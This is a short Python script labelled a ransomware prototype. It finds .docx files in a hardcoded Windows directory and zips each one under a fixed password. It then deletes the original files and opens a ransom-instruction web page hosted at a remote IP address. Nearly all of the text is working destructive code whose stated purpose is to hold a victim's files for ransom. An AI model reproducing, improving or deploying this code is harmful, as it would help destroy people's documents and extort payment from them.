#---------------------
#Juki Gladak
#Ransomware Prototype
#June 2022
#---------------------

#Import Modules

import os
import pyminizip


# Set Target Directory
os.chdir('C:/Users/agus/Documents/PROJECT2022/MyRansomWare')

# Make sure we're in a target directory
tdir = os.getcwd()
print("Target Directory is: {0}".format(tdir))

# We are targeting DOCX files to encrypt

# Store the filename in list
tgtfiles = []

# List the filename by iteration
for file in os.listdir(tdir):
	if file.endswith('.docx'):
		tgtfiles.append(file)

print(tgtfiles)

#Start to encrypt the file by zip it with password

for x in range(len(tgtfiles)):
	inputFile = tgtfiles[x]
	outputFile = tgtfiles[x]+".zip"
	password = "youraredoomed"
	compr = 5
	pyminizip.compress(inputFile,None,outputFile,password,compr)

# Now we can delete the original file
for i in range(len(tgtfiles)):
	os.remove(tgtfiles[i])

# Now we call the html page to give the victim instruction to pay the ransom
# Call the remote html page
os.system('cmd /c "start http://139.162.41.221/instruct.html"')

# Now lets test it


